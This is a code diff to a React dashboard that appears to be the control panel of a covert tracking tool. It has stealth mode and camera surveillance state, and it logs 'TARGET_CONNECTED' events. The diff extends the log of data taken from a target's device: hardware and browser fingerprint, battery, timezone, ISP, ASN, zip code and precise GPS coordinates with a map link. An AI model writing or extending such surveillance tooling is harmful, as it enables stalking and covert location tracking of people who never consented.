@@ -16,7 +16,6 @@ const Dashboard: React.FC = () => {
   const [targetCoords, setTargetCoords] = useState<{lat: number, lng: number} | null>(null);
   const [isStealth, setIsStealth] = useState(false);
   
-  // Camera Surveillance State
   const [showCameraModal, setShowCameraModal] = useState(false);
   const [cameraStream, setCameraStream] = useState<string | null>(null);
   const [isCameraActive, setIsCameraActive] = useState(false);
@@ -119,21 +118,40 @@ const Dashboard: React.FC = () => {
       (payload: DeviceInfo) => {
         playSound('connect');
         addLog(`!!! INTRUSION ALERT !!!`, 'warning');
-        if (payload.isStealth) addLog(`[STEALTH_MODE_ACTIVE]`, 'system');
+        if (payload.isStealth) addLog(`[PROTOCOL: STEALTH_MODUS]`, 'system');
         
         addLog(`TARGET_CONNECTED: ${payload.ip}`, 'success');
         
+        // Comprehensive Log Dump
+        addLog(`--- START_DEVICE_TELEMETRY ---`, 'info');
+        addLog(`OS/PLATFORM: ${payload.platform}`, 'info');
+        addLog(`LANGUAGE: ${payload.language}`, 'info');
+        addLog(`RESOLUTION: ${payload.screenWidth}x${payload.screenHeight} (@${payload.colorDepth}bit)`, 'info');
+        addLog(`BROWSER: ${payload.userAgent.split(' ').slice(-2).join(' ')}`, 'info');
+        
+        if (payload.deviceMemory) addLog(`HARDWARE_RAM: ~${payload.deviceMemory} GB`, 'info');
+        if (payload.hardwareConcurrency) addLog(`LOGICAL_CORES: ${payload.hardwareConcurrency}`, 'info');
+        if (payload.gpu) addLog(`GPU_RENDERER: ${payload.gpu}`, 'info');
+        if (payload.battery !== undefined) addLog(`ENERGY_LEVEL: ${payload.battery}%`, 'info');
+        if (payload.connectionType) addLog(`NET_CON_TYPE: ${payload.connectionType.toUpperCase()}`, 'info');
+        if (payload.timezone) addLog(`TZ_LOCALE: ${payload.timezone}`, 'info');
+        addLog(`TOUCH_POINTS: ${payload.maxTouchPoints || 0}`, 'info');
+        addLog(`REFERRER: ${payload.referrer}`, 'info');
+        
         if (payload.ipGeo) {
-           addLog(`ISP: ${payload.ipGeo.isp}`, 'info');
-           addLog(`LOCATION_ESTIMATE: ${payload.ipGeo.city}, ${payload.ipGeo.country}`, 'info');
+           addLog(`ISP_PROV: ${payload.ipGeo.isp}`, 'success');
+           addLog(`GEO_REF: ${payload.ipGeo.city}, ${payload.ipGeo.region}, ${payload.ipGeo.country} [${payload.ipGeo.zip || 'N/A'}]`, 'success');
+           if (payload.ipGeo.asn) addLog(`ASN_BLOCK: ${payload.ipGeo.asn}`, 'info');
         }
 
         if (payload.coords) {
-           addLog(`TRIANGULATION: SUCCESS`, 'success');
+           addLog(`TRIANGULATION: LOCKED_ON`, 'success');
+           addLog(`COORDS: ${payload.coords.latitude}, ${payload.coords.longitude} (ACC: ${Math.round(payload.coords.accuracy)}m)`, 'info');
            const mapsUrl = `https://www.google.com/maps?q=${payload.coords.latitude},${payload.coords.longitude}`;
-           addLog(`MAP_LINK_GENERATED`, 'system', mapsUrl);
+           addLog(`UPLINKING_SATELLITE_VIEW...`, 'system', mapsUrl);
            setTargetCoords({ lat: payload.coords.latitude, lng: payload.coords.longitude });
         }
+        addLog(`--- END_DEVICE_TELEMETRY ---`, 'info');
       },
       () => {
         setConnected(true);
